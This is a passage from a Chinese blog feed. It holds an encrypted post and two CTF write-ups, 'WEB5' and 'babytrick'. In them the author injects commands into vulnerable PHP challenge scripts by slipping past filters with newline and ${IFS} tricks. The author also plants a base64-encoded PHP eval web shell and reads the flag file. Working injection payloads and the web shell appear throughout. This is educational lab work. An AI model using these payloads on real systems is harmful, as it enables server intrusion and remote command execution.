484282560fd31615f152a96e52651322943d99c4c5244a1a95d08d6e35c8f5efa1b93b1d58daa1d1ee49de45c849b2490480af44baba15f6e5b54b979901dead49bef1d54049b28b1246881eba22483e2065a4215c914abff1487474774422a0f2f7d4318f582b748f97d4f454086b950b23587969e4f117b6ff945528ab656e14a1600277a445760838898b30c6abd600090ba68573a88742408f499cfa7fbb662cb6a780c6ee2d1f8984b9508b773ff9365afb14068bdbcb7ec3a67660adc59403cfacc4496ee891791d51e4f11af24bfcc76118a5d5ca3b7221fb3b4b3273f11a6bf7e3cd7e4c9823716d1d9abcac8d588b4215f4c84332593051a6900ee6d33608ffd503fefb46a6770ae517585558b59a45772f292b03f2b2e58f3207f32729d619db9cef7a1b7186eded1bb4e1719bc1150011a4910e802fc68e12fafb7e521964e663f2f213ea36da4b4186d82b914ec371d1f1092daa746f738ea7b7b7028b61e5c026653dd0787a5f62d8f9643e07d5032ae9b952d384769de75bff8f69f083de70c98d9c845d022bc2af389815f07589240334aa53df517357523030326885247f87e607bbd67ed43a799c2740a8ebc420e972962cde9a3eb5cbb0001f4f4710b3afed42ae9275e33412c48e7695ed25eea8a701e01a2ca6f7eb985ad92b5be4d608b3508159d0203f138aa062abddff2091ecac854d66b3a3db41d16b2ba30b3f2fd1c2b0945dd53ed61c08b3d57c82547707af47baa6183f9d37b65945da17392f7ce215aa45a11eadf9864e152eebd3eb7e54ed11a3ce54eecaee3404af8f95b60e6b461ee1eaa5c0d26769f6e7322fa80e06d5cd09772235c8f7d12962423b0ca7310ed6f5c7f6c6e01e6062de0ce3b580fa0aca6fb7faace1c5cd9d83449c040f598896e4728d232c1184972a98130efcf618801d5ebe3d0e5722c7528d3d3c23c670c88378dc213087494696bdc90ec3ac64376dbe7652465f388620bddae674d8b82f58c9900cdaab597eb0dd9d97c9badb06939155937a0feb0ddbff66544b2d2d9f425a2738b72c47910a82d968bd35b12fb1b454fb1a36b6e97afb00801f95fb2dd541052cc3500e05d65b780cd681bbddf2327251bf08ed04470d4376de8001664a355d1644f5263d77fdc50926022a962937465c23ad4272b821ed4bdf45f4445a8d34e02595f817916797d4976fa9cc21af0f8415ed502739fd52dbf215a96c03efb72c0e6b1f2828f3f00419db0fd71a16ac1b34bd07c04960da15649953a16eb139035f1d86eb4589bf28a7206f2331086c4d4541e80f8829a78e27f71860e5cc6c7216721c1a7a04e161fc6b656c6626578d952e7d9ae73a3a2986770cb96afbd8a43f1a57bfe86c4d625d5c2f377238f0fe631c68b39b765f6bbbc498385296885cd59bf6934a92252cbe74ae88f942e02edb7dc32da3aeac6b29ad330c403db0fd4129eb79fa861eb6cce0d253d338e4329d80a201c199b8c0e33735224a2fd67e93b7975fb2250ab94a5ffa2a9781160f3ba1cb263b47d71e9522ea118d46db0d26cd4e5e8341c929def4e083108e88e58bdabfb187f7ffcab0fd6180e790629adc06607b578420009ce86a5bc24b617f551382a64d6132b5f61a488777c1c643f9f52ae3b3a45a2cd3b386bd3fc9d557811768850c6ec5fec9a38b46124d67bd9a33060d3a2c051e0dffeee42cc89b04d9124d1006d2ed48871d6509e755a43d57b6116f756daefb37b16c6b5abc780f1ec6285f5180c701911bb898adac287d0e1d2c6870ed4ab8dc5e9126b30d1d96cfed2d83f9264348733f63628094dba26e9f5bfc85442ad2d10eba4386628fa0753a6d7abe78bc93323c53855fc2b86357ad2d811c7d42267471160d325f511b703d8cda22c5a92cd64104fa6f06d07a376348352a251caf8b7465bab62b0c5ae4a4a667cfb287efe25b7f1054a6d103abd5229cc5cd84c82062e874e3ad6e57e1e22afdaedd487cd3899a1d5549ba8bec1bd3fd05018e3a80ee1ed5b53337e72d3246166b07c5e336dfbb8819b64c5d28cf3f696c18bd23c3dc62cf226eb405a644705db81bf62502e432741c87b742ddf563820ff6552cdd606f73d9dcfd8dcffbd7617e87ddf3ad37bc7024dbe351ba9f086f58a3a66b573331cdcff49819c5d251632bcf76fb9023919abb9b53065be71b01d926830a55fca483e6150240f0821493b75767168fb0dce741f9d8b2f413f1b1d8dad100c121fca957fbcd3ceff0171ff282b793cfb3e54bc9d91a28740f95e5956f84dfeb85187032da3f668dd1819a768dda026e0338d00fd05de2a6b78af7e19dd5df4b06be871af25557bcdf67d3cef179591fa13c8aefcf23ecc17a9e68d9bc267e64b89d5af3ffce7a801261d85ee3f7aa2a572841f16e31ffb625a3648c1ca9144077126d9f9f98c5dbf4e1e98b24a1818ac31e1faee2224c96825eb28e9a4d6c7bd7909e24869e8d561f6d1ff7663cc47649de7f1e4305f91ec1ff93ef9f670000e2cf62723879b09861d40c955dd6a7880d00706207adaa411a553402f1d8a99e32ecc9d36884312bf4eebab23d7385553f2256787545253bd878d7806f18704a0567d900472bca1b11e572448fd5fd02b09c124c70540cf1ce22968e6b546ef1a57adb8bfc295480c647f6b457dc6586c307f46d5bf6b437284478829a55d416a7c9e65da21820a6f243db627bde4c7b3ba144c0435e6ac931450534dfd31c4b00fb11f19cb83515226f16ed89123f4ab18d955cf00d6f47cab183bd43b0f28e2dac04e59e5d0b934933c831ffdf8166f6e3212dd260cde975342b69a1eab30497e17406ea882ece30b0cf930a546808dd14f0ec6ccadf5e42f115617fac2c697afbf7496a063b4ff13f68612b9dedea1dc49048d4ef28fe0e96de5ae77d5029ca73be3d260c21dbbc5e3216a098523e07110c8e4462cb8b1930439447d15e5330279c9db32fd498205f6ce261ab5ea389ede675b8e9bfad57921e07847df564774dc440bfa4dee8817d3367679aba017eb4a5a7be31c281262cdf08c4e365c4b6a8c68926933b59c3470efe68f5c56b2c5deaaf33b4c35ffbd71abbf7b095cbffb434d55b69218d60d0f928f62bf69f989e499bf69da68eadaa071d2e206ccd979753587d5ddcc946e48d43a6ec43b65886dc9ae6eda3bf6d96312614ca0779a9ff0f7f9093063bd3d19400f397c534db58c1c85001738808178be9b89962926bde3dcc3eb706c930eb3a084dbc41e3a3c8519699ea1a4d6c9df2dfbaa18359789fc88e3ab9ca86f379cbedd99ceef5e0326238394eb4b680cf56449ad344cfcd375f1ea46874ce7ae09981fa982d28b34b3cdf7f5435cd16229822d957df9413abde10ff919399039a387df1640fac23cb486ff1625fe52e5741e9b043e83c9232c28eec8e6f6122f89ba3865872387667209ae8080147e82476baf1161574ee8c2ab735b34fdb8ce4ef335db57f36763042a4fb53d638b946e25de512a0af77f011b982243a39ee62f2273aa3f9ddae8ec725b46a7ae4ba17964886096ddddf88bd5c8fc7241e0f087757b7da66f6d6acfbcbf0a5beadc7a24c2f00bbff62c3b0766c0e4cd39a610077ee114ca773ba76710381739171312873f97a2912ad103bc4763d4a9516c4c8276f38e72b2e98b5fa0a5c135cedca0743a894cde191085864f31db75291fd0a2d1db4f8cebe7386b446449ddce2655c06a468dabc387b33d6225355ac3230598350d4d8c70e05313d604cfe04edafab56029f6bbcdbd37f46af30f187dc2e02ef6d33d7e877ce855c8c86d2a845ee50f93af82b0d66185e2335c2961c01430d15863d711d340f06be802138ae98b4875fc1858ae57b595167d62e2e91e61ff0a4c45d1ce6e774fcdc31d43b11cdf62bd004c6659b7b6bd54bfa54229df62906d2af59d89ee27ac0baf80ed0047197c353aaa51690e2f19985f40c29715a4d1ad6826a16686e13771f74e7b4dfd10820e130fe4c6994e40200a120bdcfc7360acebcd39c96cfe0a9ad00eebe078f62a15ca90e89920c95beaa46627aecbe78c8ef5b491609ebccf7524fb6aa880a9ab0bb5ab19408f9b16d79ceda301793e81b70d89a0ccbceb9671f620482800ef9eecc927a5561b0b0931b3ebdbd2e7e06c38ad8ca14454b89682f7a3e5b8b92d82ed4e22dd0071033b33d0f0715e08f0ed69b4d65996867d03e9e6eeff8d0660b19116ec76fd9396d0ff26cbeb8f37ba5888110110fafac52a195925a6182140b4c774b64ea837330f8c5a35a41ccd853e00b4797f1cbd5e954961a64b97a1b04580fd0d86983440805e92250a28efe3f95a47ce3d4523907e9cad7819fb9e25cf55b3cc75c7ae080bf28d2861823a49b4050b5531bd5c13b5c92f3b82001be7ddc175877b7daec19e764403ee8b84afae73f451d6613f748e4747d5e40e2abf7d92c45be3b09ed67f513772d30e6efd06b2c9e78176ac92737200bd20c73a8a09adbffabdff6d5ed78b91fee76d949cfdf8430f03b9eb817dacc133a9ae39080800fd49c29ccda04d0aa25e3f33c2fadd31700321ab34b12ab7da420bb191cc1d62b67877c4ec58411693abb1cdc754e2cce98949bcd1a8c5a4898c5a702217e5ff02f913b33cd277bd005564330f413939eddfa0ac0d5cbfd1ee82c6076db953e2bba171c6d48370d520e3ea991ca0c0a2fa7266777a506397cd8f9ece1d029399d65dad4a6ee2865738207fb08e9c77b1193b19367f6bb4f5f70213e947cce45e8d2ca6c6663f10a94cc1a0d318efaedb091c69b32200b4952f0d8d8ad1a973be55b33b9a1a340fc7382fc6f035effa427e4b25ca1aa5c2f225c0326a2c0e8ab2eaa1059a91f44c5d146c2cc1bd563e2d29ee7c04553863c03b64d2263f73f4c234d5064990c9d847af3e0e033e101b95d56a85e4fe9e215451eefd16048ad7b78058406a12b980f2482997e8a0772c7ee8073a383691277dd2ae5a31357b8922381911cf47861a3e75a470789bb8856a9e1eed5eb7c1e562b4cd516cc327ac54b4ff43acb671ee148d16374dc87d3bc55b06513f7961d20fbe19c5c710ad716ba6cc3b25a33f79eedb66455731d397f0ceb448cca9e898636320ed470abad8cf49b5869fd9f2f123c6f08a227a4ae7a5b1e94ad65b0201423feb259f811dabcde60940428334cd45ec404ff9bcfcd47c4aefec002a41d5615eee36493175ee9cd32a7c3fd15a15da9363bc93ff0610799918225a77f946efbfe1ceb3d4a53f7d7eec60d3a37f426991e82c1238d9717b4cc3a9dcda298c78d55a20ff6575c3753d1d77f11425e0d3985efea61bc6715a64057c63db776311840c3b2df2b61f2889f917041d210aee45216b36f2634b1c186c2438990f85337db065c68f666d5a4f630115671fbba5a6ac286966384360cf3aaf5e31fc0aa5e8ecda401f7f5dae67090491dd6e1cd1c29b59b8be2ff1650de71016d4b172692e0670b44a39b1066f5fa407356246497c85e50100acae7bb0880c742bc10709a9c1efe00ddc3045a63a9cb0bbdba3d9c53881522eaf95f47ec769695f25542b023e6fba23c17352943e0071588c53489cdad044ca45ae874f1c6434e7e64ba8d2091dad8f6a985f335ab1254edef6723913928f4e33faad0d2dd7796e1b7a4ffee49f516b1240ab753901e9bcc0690bdabc0b211a427010aecfada3d0ef807d0126146637b23faf8e77409a4a1d101abaa2ee97ae7ae68e99be775c07c89056864be5748347dd9602fb09fa92432e5a38bd24e9a8d027604bfd55f5ca0dc82e5e8297c39e2cab9f36118b275c4c949acc369c4f6f5d232c96f766ded3601442c03e9dd232a9bcf5c144dbc2e2b7597b032ac9299b4eb57e6e881589c7fe54d2aec26d7d445614437f14d42714755ae7f11d8abeaf278ce35bbccad687d5c07f414804244f542f972323a459d533b3304e5a3720c9b04e6ff8ba128683fd9e2542710f80537c006324dbd67c369e6886a7cf29cad50f0f143ea78549137cdd06a4ffff66e87f887887a58afffaa47ac0e26423e0f703d2c2d91c07b44bf38aa7200082439ea0424c8b945306d3354dfa406ed9ecc39bfb555380199a8fe174f5a2b9a21fbbc828c8d8a9aa8b10f3b4928fc6034010c3d4cf77340abeafc4464459cedf345e7c49f97aa60171f360347943122c79c78e9eea7ba31eeaba47881ccf6c127de3fbaf84a57e4ba37261257f26e55335d2b32134a788f67718f6658774f79fdb7159f2a986b6ed1aa02b9821bb0aee51298d604fe2201bbadd3c0c041cd2b551833a14ac9a2ca7d397eb5a589b3537fa174b0a4cb30869bf0faaa6e82b7b11aae1c086820536304d21f906a63fd2fa331bc6426029a63cb534a8afd93d4ba8fe8fc6cc11991685503a18df1d6acfcdd8907cace7ff40f57a8e8d4c272fb7f0c9981c6f902bb4e4e2790527844af37ca9425779c9549ddf0ee583e9879653343d78a1667d5bbbb73c192ae956f09108a1d51d158e7fd48b40e69a0a8226cfe1ef2595fd79bc4c8aeefaa38a36301aa81b123d59c5d1e6b99622510b44727bc35b38aef1d15a193eb834885c334010495fd3ecacf51e1d9a98f0cfb219b672eef68e861bcb80644228e36870f528ba86ce85b6ac553469d7e1ce1733567879fb36697cceebd9bb41fbf09ade869da53657b4bdedbdcb698964e36cb5c47a450234bad8fbc4fd3695b62f7a79eba9cb4a1df7d8fa570f113bf16be4ea7bf951373e3a99ef01dde55e494582f5be29c99d487202a0ea3c49b7fe11b852d343350eed2346ec6f9a474b7297cd905ba8441c6ca9a27d7912d7ae79c6e47c0e3b6c217c7711df451226c2c82a140d9ed121e93616c4935de9a8153e5d495da3bcab9ff4e57f96cfd9a5b3617eb90a1b064017e4fbb1052abecab059c9d342248a6c6a7d21c7fdec0551ccf35e97bf2926768cbce1cfe69c3209c9a76e9834851e8a18ff35f58498441a4a9147389004647d2e582152028b2ca5655918ef9c17eba64e1eaf82c534e3f99cc51432f62566d0d49134d313601d1e77a0067060afab5069e3d29f553a11bd77b69968507fe07a8c294dea7dc20e8eecdaca04b5625ed0fefba957f712603afb989521c7a4f990c3e429e147a30cb8fa3822ca129c331725eca11225f94c3c130a439e41bfb2abf80f1357549e3260bfa245376384c5b7a55b7b95c6ec9693e05a2c4b80eeba62d6b8d72488ba9a50d2a2556690c2742149762536a7a8e03f82b43f5d56e1e2a821f308ad8e773f903de35338d01028cea4914f97bcf5ab5984e968326759295f6fcc642f7dda70bcdfa0a26b99515b1e6c4fcc3022caf229eab88cde30a5e7b4d5c7d774f31b9cae68e45926024e88f7014d94590b4dfc2e274116bedf07b158452381ef5cdfdc7dfd49ee5ad0fe1540049ff80be122977853aae116ced51d14b6f385061226599b8ea6cb1af26eecfb5a15ae06d7cc83cc831ad9fac16bfaec945d9f67e25e8df309df30c38e4f7b887fb7f6d9f7abad3b0645a25968e9936d5ef060d1a3135b9f17c6bf76e89d62f7dc67d03322a3ee35f861ccc49580b4156e31342cc41c2af72af6ea6329da6cbf9eb18266423457231d8cdf6d8261cd73a5d01333b4d9be94ac560853e7f3f9d35603266836a57c482469df7177720e43bb509c1166ac3ce0dc63beafb69eaf6bcef4b298a648f1224f85453aafe2ec9cb4fe02fbad2da7605412125e8aa3771d68bc816989c1836e16c83aff24054ef39ad18bdd49d1ef14cd4556d42a8376fdfc932097f26fb103ece7d3ba8988d0240c57b9cb17bbdac0ab7361109279cc8a25d1d3a4ac6126a8718322986fede1e83c15e58f9e303289f80a409c7044fc82feb4a5aece4b9c578367f9d523f7e0db8bf2b859f9090829af89fdea1737364ef171a38cc60c8193b37edb97e548ee8c0fc195528c27508f56ae19d63b3b96201f8f9f1058a511ac8538d355dfeda21b9fcab885adacb2842f12a1533dc6e49e8e3e223eac474b7980a8c099a58ff1aee6bfb0c0f62e905e1fa72315bebae4a65b37e0aea472a7c33a37b13ed6406edeb1594da303408e4d3b43b9f4feb8ed136c8440d1f4bf51dd59289d993ff3fb26f367a544afb3f927e024d855b123ec511508b53cc7e5e4fb8a93e3696fdcf15d482841f2744182ae00d2f28f8a8cf08bcb6f3cefdcb0021bff00c93d7deb3a9e1b7f70face9793c27963980e678ad4e421da832cba7723c6aff52ea4f81832d95eb95974ed8503056d5d850f1bf0c0a9ff7fe33063ccb2a3acf8ad6789102fdc1891025f0fb7f1915ae23a94f23966b19cc323e340e476197b30fcae751c818254dfbb7c5fa420b607c5d84fed819cab6b7380c8d61eb370b53a24cbfc320107696d45d0db61c5649daadc035bc752ab71523c86057666e9e0b4bb4ebb03459876c9d859109c7af4be8eb52d087fbd4210f05efbc7c2dc4b9b0925dcc90226f1b35da5ed6670229b70dc0a0e4c3e5a31bf84511b0d4b9b25dceb512f063b6a7f8de4e847d4b1f93a5cbaeda39ef2c9df8cada2f113a1f12ae999e6e6cc657ada20997f34cd8063e93b2e92f9a3670df92b5636fa5b6aee85d36ac99ba4e67ae8ad5a69f99cf3530af070a99cacda234d5dd9a4ddbb99a43169ed910aef51f2091b9ed50938107c422ae75d2416712b14b3f08835a3d17d75c1d7fc95f787cacb7e03fbc5d428ac73802b84e1e63cc14ca25cc475a48d860845af4c5f8426eeabe0f831005b8a6f05a82599a0bc5d41f7347fa8ddb5954e858d2f14349c2080bb3c174639cd6e8f107f00bfdd696d8497be9bb90bd92fce693c95eee6d307e0f02411c1019ddcb977e136cfc12bc4a4545d09830b69f8d32f626d672acf18da5198f05e059b8a75b3e2d17769ef7ab50ad02aabbbf6a97ddb5321d31b0a2c7082d3cde2d88394fdd7ebc8c4ec033132f86145c17541a451d956fb55f27345573a66ca95cef85471f616e15c5d8689589445ac20c3d8a88fbaba1161aedd145e57f972d5bf6626bea5dfee0eee5ceb7cd749615da8e7b9e152deea5460ac54b62ae45b3df691a7ea9557177b13b91c2b84ab0d26ca9eebe7ffbe22a33bde898a30489b64a634d75e4f2e4581a1dd138769508a7e01b1c0cfd0cbbb047729b54094a5371140badf4741db24cc2ab9e741390107bdc36a3d028930ae5d2d0ca4c683cc58648fedbe8bb90e1dc798fd5a1491c9c0da14809483192cb969c77742e42edaa556338f3313470b1908aec4e6e07660af8a78f192e8209e0e45de753cdb4689a22428e6b4212c18c7899e60c4770e9fdbdb119c399a958a694cc6f3de1c8099ff62b482fa2f6fc4bb7a7fdf18566459b9ca5a606351d1ca24d16e14be707cc7756d619c617d9a92f0441d3c406a2ad23cf4d4301be99c23de3abcbe53e3b2edea0df23b77c2ff608012cbaca82d0cdefbd828aee8c292d5610c5120333cd150bed5cdc975c3a4922afd958dc8b8810e1ca888f3c07ecf15085b7598460c09d1fea9f3cad158e8ca90bdf3638dad10dcd174f6ce1f787f552809296cf8613215fe29cff6aa014f45689d7721b159c22761c66dcedb778688225f6669d2fee928f8110bdb1c010081e58d4352f4b0a48253b3a176104b2dbfc7be8288ee06a03225ca2421a8691085ec15f593f019b5fec81b38911fbb7ecc094e7a71dd2b801331b6ba7a5e45d14dd93a83b8c002d177017148331a484d1e3ea74492d28ede4e63df3d9cf64d77025546b910c8eef38f0f4521e62dbe119eb2e859ff90d0ba1629be2d54d458a7290fea4ba47285af869aa9b9846fefdf3753ac3641c62b3e5052905087013b87a5fe19222759bc6bb383214e5643d5aa58f53a4ea630f077f68bdf45ed910930b2ac4d4849d8954b909c2c6bf24605a2c2441bca95c593d94c3a9d15c29aaa02f3d24d6406da369c18a68efad19fc30e81dbcdf878d54ab92789236cdec205da9b17327128756604073622469b42fac4aed677246b08d2310b9913056c71b6c22833efe3e70b73d1826c1621c5f17409ca0ad52987dfb27976c86af2886b36a753ea12f304233a292c0c1673513375cabf7efff78697378c1b7b09fb1ac34e6dbad6d5223a2557c4b4ef6d9f2c5a1ea85797206e9f032dd0f5551b0f7ff682ff0f1ecf3f6542af00b59f842c0d609501d8679d5714c69526ef853089bb17755395b7e8cd16bb4b9971e83df8e</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title>竞赛课-WEB5</title>
    <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
    <content><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p>
<p>先看题目说了什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|php)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">        print_r(<span class="variable">$a</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>emmm, 总之就是过滤了’|’, ‘&amp;’, ‘; ‘, ‘空格’，’&#x2F;‘, ‘cat’, ‘flag’, ‘php’<br>先是过滤了分号的问题，我们可以用%0a绕过这个（%0a换行）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0als</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/1.png" alt="img"></p>
<p>好！什么也没看出来<br>考虑上马，这里选择用base64对一句话木马进行加密<br>原型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p>base64后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=</span><br></pre></td></tr></table></figure>

<p>因为它ban了很多重要的符号，我们就先将base64后的放到txt文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aecho<span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=&quot;</span>&gt;base64.txt</span><br></pre></td></tr></table></figure>

<p>访问base64.txt</p>
<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/2.png" alt="img"></p>
<p>OK, 下面就把它解密放到php文件中，这里我用拼接的方法绕过php过滤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aa=p%0ab=hp%0abase64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>base64.txt&gt;shell.$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>

<p>用蚁剑进行连接</p>
<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/3.png" alt="img"></p>
<p>成功连接后访问根目录</p>
<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/4.png" alt="img"></p>
<p>获得flag</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>竞赛课-babytrick</title>
    <url>/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/</url>
    <content><![CDATA[<p>看看源码是什么先</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span> &lt;?<span class="title">php</span></span><br><span class="line">    <span class="title">echo</span> &quot;<span class="title">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span>&quot;;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>); </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line">    <span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>]:<span class="string">&#x27;O_O&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;O_O&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;O_O, baby&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too small&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too big&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])?<span class="variable">$_GET</span> [<span class="string">&#x27;num&#x27;</span>]:<span class="string">&#x27;num&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no num&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$num</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;secret.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;2333333&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> too small</span><br></pre></td></tr></table></figure>

<p>好！先是一个_的问题，这里直接用空格或者是%0a就能替换掉，这样第一个就过了。<br>其次就是一个数字大小判断的问题，这里用数组进行绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?O O[]=9999999999</span><br></pre></td></tr></table></figure>

<p>num的要求是2，但不能是数字</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num=2a</span><br></pre></td></tr></table></figure>

<p>f12查看源码，发现多了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="string">&quot;my secret is in f35cdaa4e8672a43e73aee7c2dd51731, try to get it&quot;</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>访问f35cdaa4e8672a43e73aee7c2dd51731.php</p>
<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/1.png" alt="img"></p>
<p>绕过问题<br>看看有什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/2.png" alt="img"></p>
<p>抓个当前的php看看先，这里过滤了cat，php，我们用tac</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">tac</span><span class="variable">$&#123;IFS&#125;</span>f35cdaa4e8672a43e73aee7c2dd51731.p<span class="string">&quot;&quot;</span>hp</span><br></pre></td></tr></table></figure>

<p>这样就ok啦，整理下返回的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*php.*$|^.*echo.*$|^.*cat.*$|^.*busybox.*$|[A-Z0-9a-z].*&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&amp;[A-Za-z0-9]|^.*rm.*$/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概就是这个样子了<br>构造我们的payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=%0als /</span><br><span class="line">?cmd=%0atac /flag</span><br></pre></td></tr></table></figure>

<p>这样就能拿到flag了</p>
